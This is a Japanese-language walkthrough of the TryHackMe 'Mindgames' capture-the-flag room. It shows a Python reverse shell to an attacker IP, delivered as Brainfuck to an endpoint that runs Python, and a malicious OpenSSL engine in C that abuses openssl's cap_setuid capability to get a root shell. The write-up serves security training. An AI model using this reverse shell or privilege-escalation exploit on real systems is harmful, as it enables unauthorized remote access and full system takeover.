# Mindgames CTF

https://tryhackme.com/room/mindgames

## Enumeration

```shell
TARGET=10.201.99.237
sudo bash -c "echo $TARGET   mindgames.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60
```

bf以外のAPIエンドポイントを探すが、bf以外見つからない。

```sh
root@ip-10-201-47-89:~# ffuf -u http://mindgames.thm/api/FUZZ -X POST -d "data" -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://mindgames.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt
 :: Data             : data
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 404
________________________________________________

bf                      [Status: 200, Size: 0, Words: 1, Lines: 1]
:: Progress: [475254/475254] :: Job [1/1] :: 10696 req/sec :: Duration: [0:00:58] :: Errors: 0 ::
```

全く分からない・・・

https://tryhackme.com/room/wonderland を先に完了することを強くお勧めするという記述を見かけたので、それに従って後回し。  
→ クリアして戻ってきた。

昨日はトップページに記載されているコードを貼り付けただけだったので、別の場所から持ってきた、ABC と出力するコードを試してみる。

```
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.+.+.>++++++++++.
```

すると、このエラー。Pythonが動いていることが分かる。

```
Program Output:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'ABC' is not defined
```

Hello, World と表示するコードを、別のサイトで実行してみたところ、

```
+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.
```

下記のように変換された。

```
print("Hello, World")
```

つまり、Brainfuckの実行結果がPythonコードになっていたらそのまま実行されることが分かった。

Pythonのリバースシェルコードを、

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.85.243",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
```

[brainfuck のコードに変換](https://copy.sh/brainfuck/text.html)して送信。

シェル取得成功！

```sh
$ nc -lnvp 8888         
listening on [any] 8888 ...
connect to [10.13.85.243] from (UNKNOWN) [10.201.22.75] 54158
$ id
id
uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
```

## 権限昇格

openssl に cap_setuid がついている？

```sh
mindgames@mindgames:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```

https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/ から拝借（unistd.hインクルードは追加した）

```c
#include <openssl/engine.h>
#include <unistd.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

kaliでコンパイル

```sh
$ gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c

$ gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o

$ ls
openssl-exploit-engine.c  openssl-exploit-engine.o  openssl-exploit-engine.so
```

ターゲットにコピーしてエクスプロイト。root昇格成功！

```sh
es@mindgames:~$ openssl req -engine ./openssl-exploit-engine.so
root@mindgames:~# id
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
```

## 振り返り

- 掲載されていたbrainfuckコードの実行結果が、まさかPythonコードに変換されていたとは盲点だった。まさにマインドゲーム。
- スタックしたら列挙を徹底的にやれというのはミスリードだったと思う。
- openssl, setsuid のエクスプロイトは初見。
